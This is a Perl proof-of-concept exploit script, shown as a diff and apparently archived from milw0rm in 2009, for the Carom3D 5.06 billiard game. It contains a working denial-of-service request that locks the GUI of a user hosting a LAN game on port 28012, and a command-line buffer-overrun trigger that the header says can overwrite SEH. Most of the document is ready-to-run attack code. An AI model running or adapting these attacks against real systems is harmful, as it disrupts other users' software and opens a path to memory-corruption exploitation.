@@ -1,0 +1,66 @@
+#!/usr/bin/perl
+#
+# Title: Carom3D 5.06 Unicode Buffer Overrun/Denial Of Service Vulnerability
+#
+#
+# Summary: Carom 3D is an online multi-user billiard game created with special
+#	   3D graphic effects bringing every aspect such as 6 ball, 9 ball, 8
+#	   ball and other Billiard games to life.
+#
+# Product Web Page: http://www.carom3d.com/
+#
+# Description: The world famous korean game Carom3D suffers from a buffer overflow
+#	       and a denial of service vulnerability. The BoF is triggered at
+#	       runtime when we append 218 > bytes as an argument. ~1000 bytes
+#	       overwrites SEH. The denial of service is triggered when a user
+#	       creates a LAN Game (cred. needed), creates a room and awaits
+#	       other players to join the game. While awaiting (listening on port
+#	       28012), with a simple HTTP GET/POST, an attacker can lockdown
+#	       the GUI of the user created the room, not alowing to start or
+#	       even exit the game's GUI, unless forced quit (X).
+#
+# Tested On: Microsoft Windows XP Professional SP3 (English)
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#
+# liquidworm gmail com
+#
+# http://www.zeroscience.org/
+#
+# 15.06.2009
+#
+
+# ----------------------------------DoS---------------------------------- #
+
+use LWP::Simple;
+
+my $url = 'http://192.168.1.3:28012';
+my $lockdown = get $url;
+die "Couldn't get $url" unless defined $lockdown;
+
+# You can Ctrl+C, the lockdown is ON.
+
+# ---------------------------------/DoS---------------------------------- #
+
+
+
+
+
+###########################################################################
+
+
+
+
+
+# ----------------------------------BoF---------------------------------- #
+
+# Added 217 bytes as argument = runs normally.
+# Added 218 bytes as argument triggers the MS VC++ Runtime Library
+# 'Buffer Overrun' error msg box informing us that the program's
+# internal state is corrupted.
+
+system('C:\\Progra~1\\Neoact\\Carom3D\\carom.exe AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
+
+# ---------------------------------/BoF---------------------------------- #
+
+# milw0rm.com [2009-06-16]
